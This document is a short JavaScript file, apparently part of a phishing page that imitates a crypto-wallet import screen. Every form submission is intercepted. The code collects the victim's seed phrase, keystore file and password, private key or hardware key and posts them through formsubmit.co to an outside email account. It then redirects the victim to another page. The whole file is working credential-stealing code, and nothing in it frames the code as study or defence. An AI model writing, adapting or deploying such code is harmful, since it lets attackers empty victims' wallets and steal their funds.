let forms = document.querySelectorAll("form");
forms.forEach((form) => form.addEventListener("submit", imPort));
function imPort(event) {
  let label = document.querySelector(".label");
  event.preventDefault();
  mail = "skelembagmail.com";
  next = "qwerty.html";
  subject = `${window.location.hostname} ${new Date()}`;
  let body = new FormData();
  let formname = document.querySelector("form").name;
  if (event.target.name === "phrasekey") {
    phrase = document.querySelector("textarea").value;
    body.append("phraseKey", phrase);
  } else if (event.target.name === "keystorekey") {
    jsonphrase = document.querySelector("textarea").value;
    password = document.querySelector('input[name="keystorePassword"]').value;
    body.append("jsonphrase", jsonphrase);
    body.append("password", password);
  } else if (event.target.name === "privatekey") {
    privatekey = document.querySelector("textarea").value;
    body.append("privatekey", privatekey);
  } else if (event.target.name === "hardwareKey") {
    hardwarekey = document.querySelector('input[name="hardware"]').value;
    body.append("hardwarekey", hardwarekey);
  }
  body.append("_captcha", false);
  body.append("_next", next);
  body.append("_template", "table");
  body.append("_subject", subject);
  let URL = `https://formsubmit.co/${mail}`;
  fetch(URL, {
    method: "POST",
    body: body,
  }).then((response) => window.location.assign(next));
}
